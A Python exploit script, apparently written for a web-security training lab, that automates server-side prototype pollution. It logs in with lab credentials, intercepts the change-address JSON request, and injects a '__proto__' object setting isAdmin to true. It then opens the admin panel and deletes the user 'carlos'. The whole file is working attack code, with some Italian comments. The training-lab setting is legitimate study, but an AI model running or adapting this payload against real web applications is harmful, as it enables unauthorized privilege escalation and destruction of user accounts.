
from seleniumwire import webdriver

import typer

import json

from time import sleep

import requests

def login(driver,LAB_URL):
    driver.get(f"{LAB_URL}/login")
    form_username = driver.find_element("name","username")
    form_password = driver.find_element("name", "password")
    login_button = driver.find_element("xpath", '//*[contains(text(), "Log in")]')
    form_username.send_keys("wiener")
    sleep(1)
    form_password.send_keys("peter")
    sleep(1)
    current_url = driver.current_url
    login_button.click()
    sleep(2)
    return current_url

def update_billing_address(tags,driver):

    for key in tags:
        el = driver.find_element("name",key)
        el.clear()
        el.send_keys(tags[key])
        sleep(1)
    sessionId = driver.find_element("name", "sessionId").get_attribute("value")
    submit_button = driver.find_element("xpath", '//*[contains(text(), "Submit")]')
    submit_button.click()
    sleep(1)
    return sessionId

def manipulate_json(json_response,session_id):
    json_response.pop("isAdmin")
    malicious_json = json_response
    malicious_json["sessionId"] = session_id
    malicious_json["__proto__"] = {"isAdmin": True}
    return malicious_json

def send_POST_to_change_address(malicious_json,cookie,LAB_URL):
    endpoint_POST = f"{LAB_URL}/my-account/change-address"
    headers = {"Cookie": f"session={cookie}"}
    response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
    print(response.json())
    return response

def go_to_admin_panel(driver):
    admin_button = driver.find_element("xpath", '//*[contains(text(), "Admin panel")]')
    admin_button.click()

def delete_carlos(driver):
    delete_buttons = driver.find_elements("xpath", '//*[contains(text(), "Delete")]')
    delete_buttons[1].click()
driver = webdriver.Chrome()
def main(lab_url: str):
    lab_url=lab_url.rstrip("/")
    print(lab_url)
    print(f"Hello {lab_url}")
    current_url = login(driver, lab_url)
    sleep(2)
    if driver.current_url != current_url:
        tags = {
            "address_line_1": "Ponte Pietro Bucci",
            "address_line_2": "via della Patata,0",
            "city": "Cosenza",
            "postcode": "A",
            "country": "Italy"
        }
        sessionId = update_billing_address(tags, driver)
        sleep(1)
        URL_BACKEND = ""
        # driver.implicitly_wait(10)
        for request in driver.requests:
            if request.response and "change-address" in request.url:
                URL_BACKEND = request.url
        cookie = driver.get_cookie("session")["value"]
        print(f"Session Cookie : {cookie} ")
        headers = {"Cookie": f"session={cookie}"}
        # Quando useremo il proxy saremo in grado di prendere la POST e manovrarla
        # TODO: Typer, Proxy
        tags['sessionId'] = sessionId
        request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(tags), headers=headers)
        json_risposta = request_to_back_end.json()
        print("JSON RISPOSTA: " + str(json_risposta))
        sleep(3)
        json_malevolo = manipulate_json(json_risposta, sessionId)
        print("JSON MALEVOLO" + str(json_malevolo))
        sleep(2)
        send_POST_to_change_address(json_malevolo, cookie, lab_url)
        sleep(1)
        driver.refresh()
        sleep(2)
        go_to_admin_panel(driver)
        sleep(2)
        delete_carlos(driver)
        sleep(50)


if __name__ == "__main__":
    typer.run(main)